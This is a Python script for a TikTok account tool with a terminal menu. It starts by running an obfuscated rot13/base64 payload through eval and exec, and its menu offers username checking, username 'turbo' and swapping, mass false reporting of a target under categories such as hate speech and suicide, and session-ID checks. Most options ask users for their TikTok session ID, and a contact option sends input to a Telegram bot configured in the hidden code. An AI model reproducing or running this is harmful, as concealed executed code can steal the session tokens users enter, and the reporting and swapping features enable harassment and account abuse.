love = '0MEVtbXL2SxnJDtCFNvZGDlZwH5Amx1AvVXPaWwVQ0tVhXHwBXHtBXzy1WYGhP/vTAioa'
god = 'RhY3TippjilIDinbLijIHinbMiCgptYyA9ICLilJzilIDilIDilbwg4qaXTWVzc2FnZeK'
destiny = 'zzPQvan/van/van8tVtbXnUxtCFNv4cFH4cFN4dnKFT9jMFOMo3HtGTyeMJDtFKGvcctv'
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))

def slow(M):
	for c in M + '\n':
		sys.stdout.write(c)
		sys.stdout.flush()
		time.sleep(0.6 / 120)
slow(Style.RESET_ALL+Fore.WHITE  + """
╭━━━━┳╮╭━━━━╮╱╭╮
┃╭╮╭╮┃┃┃╭╮╭╮┃╱┃┃
╰╯┃┃┣┫┃┣┫┃┃┣┻━┫┃╭╮
╱╱┃┃┣┫╰╯╯┃┃┃╭╮┃╰╯╯
╱╱┃┃┃┃╭╮╮┃┃┃╰╯┃╭╮╮
╱╱╰╯╰┻╯╰╯╰╯╰━━┻╯╰╯
╭━━━┳╮╱╱╱╱╱╱╱╭╮
┃╭━╮┃┃╱╱╱╱╱╱╱┃┃
┃┃╱╰┫╰━┳━━┳━━┫┃╭┳━━┳━╮          
┃┃╱╭┫╭╮┃┃━┫╭━┫╰╯┫┃━┫╭╯        
┃╰━╯┃┃┃┃┃━┫╰━┫╭╮┫┃━┫┃          
╰━━━┻╯╰┻━━┻━━┻╯╰┻━━┻╯         """)
print("")
def slow(M):
	for c in M + '\n':
		sys.stdout.write(c)
		sys.stdout.flush()
		time.sleep(0.4 / 120)
slow(Style.BRIGHT+wh+'┌─' +b+'['+wh+'Main'+b+']'+wh+'─'+b+'['+g+'~'+b+']' + wh+"""
│
├──╼ """+b+ '['+wh+'1'+b+']'+re+' ❯'+wh+'❯'+b+'❯'+wh+' TikTok-Checker '+wh+"""
│
├──╼ """+b+ '['+wh+'2'+b+']'+re+' ❯'+wh+'❯'+b+'❯'+wh+' TikTok-Turbo'+wh+"""
│
├──╼ """+b+'['+wh+'3'+b+']'+re+' ❯'+wh+'❯'+b+'❯'+wh+' TikTok-Swapper' +wh+"""
│
├──╼ """+b+'['+wh+'4'+b+']'+re+' ❯'+wh+'❯'+b+'❯'+wh+' TikTok-Report' +wh+"""
│
├──╼ """+b+'['+wh+'5'+b+']'+re+' ❯'+wh+'❯'+b+'❯'+wh+' Check IP Status' +wh+"""
│
├──╼ """ +b+'['+wh+'6'+b+']'+re+' ❯'+wh+'❯'+b+'❯'+wh+' Check SessionID Status'+wh+"""
│
├──╼ """+b+'['+wh+'7'+b+']'+re+' ❯'+wh+'❯'+b+'❯'+wh+' Contact The Developer' +wh)
kieu = input("""│
├────╼ """+b+'['+wh+'Enter The Number'+b+']'+re+' ❯'+wh+'❯'+b+'❯ '+wh)
if kieu == "1":
	def slow(M):
		for c in M + '\n':
			sys.stdout.write(c)
			sys.stdout.flush()
			time.sleep(0.7 / 120)
	slow(Style.BRIGHT+wh+"""│
├───""" +b+'['+wh+'Checker'+b+']'+wh+'─'+b+'['+g+'~'+b+']' +wh+"""
│
├─────╼ """+b+'['+wh+'1'+b+']'+re+' ❯'+wh+'❯'+b+'❯ '+wh+'TikTok Checker With SessionID'"""
│
├─────╼ """+b+'['+wh+'2'+b+']'+re+' ❯'+wh+'❯'+b+'❯ '+wh+'TikTok Checker Without SesssionID')
	ctct = input("""│
├──────╼ """+b+'['+wh+'Enter The Number'+b+']'+re+' ❯'+wh+'❯'+b+'❯ '+wh)
	if ctct == "1":
		def slow(M):
			for c in M + '\n':
				sys.stdout.write(c)
				sys.stdout.flush()
				time.sleep(0.7 / 120)
		slow(Style.BRIGHT+wh+"""│
├────""" +b+'['+wh+'UserLength'+b+']'+wh+'─'+b+'['+g+'~'+b+']' +wh+"""
│
├───────╼ """+b+'['+wh+'Quad With Semi-Triple'+b+']'+re+' ❯'+wh+'❯'+b+'❯ '+wh+"""
│
├───────╼ """+b+'['+wh+'Semi-Triple '+b+']'+re+' ❯'+wh+'❯'+b+'❯ '+wh+"""
│
├───────╼ """+b+'['+wh+'Triple '+b+']'+re+' ❯'+wh+'❯'+b+'❯ '+wh+res)
		llll = input("""│
├────────╼ """+b+'['+wh+'Enter The Number'+b+']'+re+' ❯'+wh+'❯'+b+'❯ '+wh)
		if llll == "1":
			sessionId = input("""│
├────────╼ """+b+'['+wh+'Enter SessionID'+b+']'+re+' ❯'+wh+'❯'+b+'❯ '+wh)
			rbaee()
		elif llll == "2":
			sessionId = input("""│
├────────╼ """+b+'['+wh+'Enter SessionID'+b+']'+re+' ❯'+wh+'❯'+b+'❯ '+wh)
			shbh()
		elif llll == "3":
			sessionId = input("""│
├────────╼ """+b+'['+wh+'Enter SessionID'+b+']'+re+' ❯'+wh+'❯'+b+'❯ '+wh)
			thlath()
	if ctct == "2":
		def slow(M):
			for c in M + '\n':
				sys.stdout.write(c)
				sys.stdout.flush()
				time.sleep(0.7 / 120)
		slow(Style.BRIGHT+wh+"""│
├─""" +b+'['+wh+'UserLength'+b+']'+wh+'─'+b+'['+g+'~'+b+']' + wh+"""
│
├──╼ """+b+ '['+wh+'1'+b+']'+re+' ❯'+wh+'❯'+b+'❯'+wh+' Quad Userames With Semi-triple'+wh+"""
│
├──╼ """+b+ '['+wh+'2'+b+']'+re+' ❯'+wh+'❯'+b+'❯'+wh+' Semi-triples'+wh+"""
│
├──╼ """+b+'['+wh+'3'+b+']'+re+' ❯'+wh+'❯'+b+'❯'+wh+' Triple' +wh)
		wlwl = input("""│
├──────╼ """+b+'['+wh+'Enter The Number'+b+']'+re+' ❯'+wh+'❯'+b+'❯ '+wh)
		if wlwl == "1":
			rbaeewol()
		elif wlwl == "2":
			shbhwol()
		elif wlwl == "3":
			thlathwol()
		else:
			print("""│
├──╼ """+b+'['+re+'ERR'+b+']'+re+' ❯'+wh+'❯'+b+'❯'+wh+' Invalid Input')

elif kieu == "2":
	def slow(M):
		for c in M + '\n':
			sys.stdout.write(c)
			sys.stdout.flush()
			time.sleep(0.7 / 120)
	slow(Style.BRIGHT+wh+"""│
├───""" +b+'['+wh+'UserLength'+b+']'+wh+'─'+b+'['+g+'~'+b+']' + wh+"""
│
├────╼ """+b+ '['+wh+'1'+b+']'+re+' ❯'+wh+'❯'+b+'❯'+wh+' Quad Userames With Semi-triple'+wh+"""
│
├────╼ """+b+ '['+wh+'2'+b+']'+re+' ❯'+wh+'❯'+b+'❯'+wh+' Semi-triples'+wh+"""
│
├────╼ """+b+'['+wh+'3'+b+']'+re+' ❯'+wh+'❯'+b+'❯'+wh+' Triple' +wh)
	tctc = input("""│
├─────╼ """+b+'['+wh+'Enter The Number'+b+']'+re+' ❯'+wh+'❯'+b+'❯ '+wh)
	if tctc == "1":
		sessionId = input("""│
├─────╼ """+b+'['+wh+'Enter SessionID'+b+']'+re+' ❯'+wh+'❯'+b+'❯ '+wh)
		rbaeetc()
	elif tctc == "2":
		sessionId = input("""│
├─────╼ """+b+'['+wh+'Enter SessionID'+b+']'+re+' ❯'+wh+'❯'+b+'❯ '+wh)
		shbhtc()
	elif tctc == "3":
		sessionId = input("""│
├─────╼ """+b+'['+wh+'Enter SessionID'+b+']'+re+' ❯'+wh+'❯'+b+'❯ '+wh)
		thlathtc()

elif kieu == "3":
	slow(Style.BRIGHT+wh+"""│
├───""" +b+'['+wh+'Swapper'+b+']'+wh+'─'+b+'['+g+'~'+b+']' +wh+res)
	sessionId = input("""│
├───────╼ """+b+'['+wh+'Enter SessionID'+b+']'+re+' ❯'+wh+'❯'+b+'❯ '+wh)
	user = input("""│
├───────╼ """+b+'['+wh+'Enter User'+b+']'+re+' ❯'+wh+'❯'+b+'❯ '+wh)
	ttu()

elif kieu == "4":
	slow(Style.BRIGHT+wh+"""│
├───""" +b+'['+wh+'Report'+b+']'+wh+'─'+b+'['+g+'~'+b+']' +wh+"""
│
├───────╼ """+b+'['+wh+'1'+b+']'+re+' ❯'+wh+'❯'+b+'❯ '+wh+"Normal "+wh+"""
│
├───────╼ """+b+'['+wh+'2'+b+']'+re+' ❯'+wh+'❯'+b+'❯ '+wh+"Hate Speech"+wh+"""
│
├───────╼ """+b+'['+wh+'3'+b+']'+re+' ❯'+wh+'❯'+b+'❯ '+wh+"Suicide")
	rprt = input("""│
├────────╼ """+b+'['+wh+'Enter The Number'+b+']'+re+' ❯'+wh+'❯'+b+'❯ '+wh)
	if rprt == "1":
		sessionId = input("""│
├────────╼ """+b+'['+wh+'Enter SessionID'+b+']'+re+' ❯'+wh+'❯'+b+'❯ '+wh)
		trgt = input("""│
├────────╼ """+b+'['+wh+'Enter Target'+b+']'+re+' ❯'+wh+'❯'+b+'❯ '+wh)
		slep = int(input("""│
├────────╼ """+b+'['+wh+'Enter Sleep'+b+']'+re+' ❯'+wh+'❯'+b+'❯ '+wh))
		ttrpn()
	elif rprt == "2":
		sessionId = input("""│
├────────╼ """+b+'['+wh+'Enter SessionID'+b+']'+re+' ❯'+wh+'❯'+b+'❯ '+wh)
		trgt = input("""│
├────────╼ """+b+'['+wh+'Enter Target'+b+']'+re+' ❯'+wh+'❯'+b+'❯ '+wh)
		slep = int(input("""│
├────────╼ """+b+'['+wh+'Enter Sleep'+b+']'+re+' ❯'+wh+'❯'+b+'❯ '+wh))
		ttrph()
	elif rprt == "3":
		sessionId = input("""│
├────────╼ """+b+'['+wh+'Enter SessionID'+b+']'+re+' ❯'+wh+'❯'+b+'❯ '+wh)
		trgt = input("""│
├────────╼ """+b+'['+wh+'Enter Target'+b+']'+re+' ❯'+wh+'❯'+b+'❯ '+wh)
		slep = int(input("""│
├────────╼ """+b+'['+wh+'Enter Sleep'+b+']'+re+' ❯'+wh+'❯'+b+'❯ '+wh))
		ttrps()

elif kieu == "5":
	slow(Style.BRIGHT+wh+"""│
├───""" +b+'['+wh+'IP-Check'+b+']'+wh+'─'+b+'['+g+'~'+b+']' +wh+res)
	vpncheck()

elif kieu == "6":
	slow(Style.BRIGHT+wh+"""│
├───""" +b+'['+wh+'S-ID-Check'+b+']'+wh+'─'+b+'['+g+'~'+b+']' +wh+res)
	sessionId = input("""│
├───────╼ """+b+'['+wh+'Enter SessionID'+b+']'+re+' ❯'+wh+'❯'+b+'❯ '+wh)
	sessionIDcheck()

elif kieu == "7":
	def slow(M):
		for c in M + '\n':
			sys.stdout.write(c)
			sys.stdout.flush()
			time.sleep(1 / 120)
	slow(Style.BRIGHT+wh+"""│
├───"""+b+'['+wh+'contact'+b+']'+wh+'─'+b+'['+g+'~'+b+']' + wh+"""
│
├────╼ """+b+'['+wh+'•'+b+']'+wh+re+' ❯'+wh+'❯'+b+'❯'+wh+" Anything You Write Here It will reach The Dev" +wh+"""
│
├────╼ """+b+'['+wh+'1'+b+']'+wh+re+' ❯'+wh+'❯'+b+'❯'+wh+' Telegram @t7ttt7' +wh+res)
	cad = input("""│
├───────╼ """+b+'['+wh+'Write'+b+']'+re+' ❯'+wh+'❯'+b+'❯ '+wh)
	send =('https://api.telegram.org/bot'+tcad+'/sendMessage?chat_id='+cadid+'&text='+rc+'\n'+mc+'*'+cad+'*'+'\n'+hy+'&parse_mode=MARKDOWN')
	r = requests.post(send)
	print(f"""{Style.BRIGHT}│
├──╼ {b}[{g}✓{b}]{wh}{re} ❯{wh}❯{b}❯{wh} {wh}Done ✓{res}""")

else:
	print("""│
├──╼ """+b+'['+re+'✘'+b+']'+re+' ❯'+wh+'❯'+b+'❯'+wh+' Invalid Input')
